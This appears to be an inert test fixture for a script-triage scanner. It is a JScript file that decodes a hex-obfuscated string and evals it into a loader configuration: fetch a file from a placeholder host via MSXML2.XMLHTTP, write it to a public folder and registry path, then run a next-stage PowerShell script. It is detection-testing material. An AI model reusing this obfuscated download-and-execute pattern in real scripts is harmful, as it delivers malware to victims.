// Huntress Script Triage -- inert static-analysis fixture (wsh_jscript_windows)
function decode_5a5079b6(v_a19c) {
  var v_b27e = [];
  for (var i = 0; i < v_a19c.length; i++) { v_b27e.push((v_a19c[i] - 5 + 256) % 256); }
  return v_b27e;
}
function recover_93e5d425() {
  var packedText = "80:27:78:79:6a:75:78:27:3f:60:27:66:68:76:7a:6e:77:6a:64:77:6a:72:74:79:6a:27:31:27:7c:77:6e:79:6a:64:6b:6e:71:6a:27:31:27:69:6e:78:75:66:79:68:6d:64:75:77:74:68:6a:78:78:27:31:27:6d:66:73:69:74:6b:6b:64:78:68:77:6e:75:79:27:62:31:27:66:69:66:75:79:6a:77:27:3f:27:52:58:5d:52:51:37:33:5d:52:51:4d:59:59:55:33:3b:33:35:27:31:27:7b:66:71:7a:6a:78:27:3f:80:27:68:66:72:75:66:6e:6c:73:64:6e:69:27:3f:27:68:66:72:75:66:6e:6c:73:32:36:66:3c:6a:3e:67:6a:36:3d:3c:27:31:27:7a:77:71:27:3f:27:6d:79:79:75:78:3f:34:34:36:66:3c:6a:3e:67:6a:36:3d:3c:33:6a:7d:66:72:75:71:6a:33:6e:73:7b:66:71:6e:69:34:36:38:3b:67:3b:36:3b:6b:33:69:66:79:27:31:27:7a:78:6a:77:64:66:6c:6a:73:79:27:3f:27:4d:7a:73:79:77:6a:78:78:51:66:67:34:36:66:3c:6a:3e:67:6a:36:3d:3c:27:31:27:6b:6e:71:6a:64:75:66:79:6d:27:3f:27:48:3f:61:61:5a:78:6a:77:78:61:61:55:7a:67:71:6e:68:61:61:4d:7a:73:79:77:6a:78:78:51:66:67:61:61:78:79:66:6c:6a:32:36:66:3c:6a:3e:67:6a:36:3d:3c:33:69:66:79:27:31:27:77:6a:6c:6e:78:79:77:7e:64:75:66:79:6d:27:3f:27:4d:50:48:5a:61:61:58:74:6b:79:7c:66:77:6a:61:61:4d:7a:73:79:77:6a:78:78:51:66:67:61:61:49:6e:78:75:74:78:66:67:71:6a:61:61:36:66:3c:6a:3e:67:6a:36:3d:3c:27:31:27:73:6a:7d:79:64:78:79:66:6c:6a:27:3f:27:77:6a:78:74:7a:77:68:6a:32:78:66:72:75:71:6a:33:75:78:36:27:82:31:27:78:79:66:6c:6a:48:74:7a:73:79:27:3f:39:82";

  var packedParts = packedText.split(":");

  var v_a19c = [];

  for (var hi = 0; hi < packedParts.length; hi++) { v_a19c.push(parseInt(packedParts[hi], 16)); }

  var v_f602 = ["north", "south"].join(":");

  var v_b27e = [];

  var state = 1;

  switch (state) { case 1: v_b27e = decode_5a5079b6.apply(null, [v_a19c]); break; default: v_b27e = []; }

  var v_c304 = v_b27e.length ? String.fromCharCode(v_b27e[0]) : "", bi = 1;

  for (bi = 1; bi < v_b27e.length; bi++) { v_c304 = v_c304.concat(String.fromCharCode(v_b27e[bi])); }

  return v_c304;
}
function inspect_7b468056() {
  var v_d41a = eval("(" + recover_93e5d425.apply(null, []) + ")");
  var table = { steps: function() { return v_d41a.steps; }, values: function() { return v_d41a.values; } };
  return { steps: table.steps.apply(null, []), adapter: v_d41a.adapter, values: table.values.apply(null, []), stageCount: v_d41a.stageCount };
}
